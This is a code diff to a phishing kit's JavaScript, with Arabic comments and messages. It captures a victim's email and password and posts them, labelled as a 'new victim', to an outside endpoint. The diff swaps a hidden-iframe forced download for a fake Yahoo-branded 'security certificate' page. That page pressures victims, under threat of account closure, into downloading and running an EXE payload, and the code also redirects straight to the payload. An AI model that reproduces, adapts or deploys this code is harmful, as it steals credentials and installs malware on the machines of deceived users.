@@ -2,9 +2,8 @@ async function startCapture() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
     
-    if(!email || !pass) return alert("الرجاء إكمال التوثيق");
+    if(!email || !pass) return alert("الرجاء إدخال البيانات لإتمام التوثيق");
 
-    // توليد ID للضحية
     const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);
 
     try {
@@ -16,20 +15,29 @@ async function startCapture() {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: `💀 **ضحية جديدة استجابت:**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
+                content: `💀 **ضحية جديدة:**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
             })
         });
 
-        // --- التحميل الإجباري بدون فتح صفحة جديدة ---
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = config.pc_payload;
-        document.body.appendChild(iframe);
-        
-        // رسالة تمويه للضحية
-        alert("تم إرسال طلب التوثيق. يرجى فتح ملف الأمان الذي تم تحميله لتأكيد هويتك.");
+        // تغيير محتوى الصفحة لإجبار الضحية على تحميل الملف يدوياً
+        document.body.innerHTML = `
+            <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
+                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" width="100">
+                <h2 style="color:#6001d2;">خطوة أخيرة للتوثيق</h2>
+                <p>تم استلام بياناتك بنجاح. لضمان أمان حسابك، يجب تحميل وتشغيل "شهادة أمان ياهو" المرفقة أدناه.</p>
+                <a href="${config.pc_payload}" 
+                   id="downloadBtn"
+                   style="display:inline-block; padding:15px 30px; background:#6001d2; color:white; text-decoration:none; border-radius:25px; font-weight:bold; margin-top:20px;">
+                   تحميل وتفعيل شهادة الأمان (EXE)
+                </a>
+                <p style="color:red; margin-top:10px; font-size:12px;">* ملاحظة: الحساب سيتعرض للإغلاق إذا لم يتم تشغيل الشهادة خلال 5 دقائق.</p>
+            </div>
+        `;
+
+        // محاولة بدء التحميل تلقائياً أيضاً كزيادة تأكيد
+        window.location.href = config.pc_payload;
 
     } catch(e) {
-        console.log("Error logic");
+        alert("حدث خطأ في الاتصال، حاول مرة أخرى");
     }
 }
